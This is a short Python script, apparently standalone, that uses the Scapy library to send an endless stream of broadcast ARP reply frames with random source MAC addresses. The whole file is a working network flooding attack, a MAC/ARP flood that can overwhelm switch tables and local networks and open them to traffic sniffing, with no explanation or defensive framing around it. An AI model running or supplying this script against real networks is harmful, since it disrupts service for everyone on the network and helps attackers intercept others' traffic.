from scapy.all import *
while 1:
	sendp(Ether(src=RandMAC() ,dst='FF:FF:FF:FF:FF:FF')/ARP(op=2, psrc="0.0.0.0", hwdst='FF:FF:FF:FF:FF:FF'))